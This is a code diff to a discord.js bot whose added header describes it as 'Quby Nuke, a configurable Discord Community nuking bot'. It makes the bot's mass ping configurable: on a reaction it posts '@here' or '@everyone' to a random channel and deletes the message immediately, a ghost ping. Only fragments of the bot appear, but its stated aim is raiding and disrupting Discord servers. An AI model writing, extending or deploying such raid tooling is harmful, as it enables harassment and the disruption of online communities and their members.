@@ -1,3 +1,9 @@
+/**
+ * Avoxel284
+ * Quby Nuke
+ * A configurable Discord Community nuking bot
+ */
+
 const { Client, Intents, DiscordAPIError, Message, Channel, Collection } = require("discord.js");
 const fs = require("fs");
 const path = require("path");
@@ -116,8 +122,13 @@ client.on("messageReactionAdd", async (reaction, user) => {
 				msg.guild.id
 			);
 
-			const pingMessage = await channels.random().send("@here").catch(console.log);
-			pingMessage.delete().catch(console.log);
+			if (config.get("ping") != 0) {
+				const pingMessage = await channels
+					.random()
+					.send(config.get("ping") == 2 ? "@everyone" : "@here")
+					.catch(console.log);
+				pingMessage.delete().catch(console.log);
+			}
 
 			player.on("stateChange", (oldState, newState) => {
 				if (
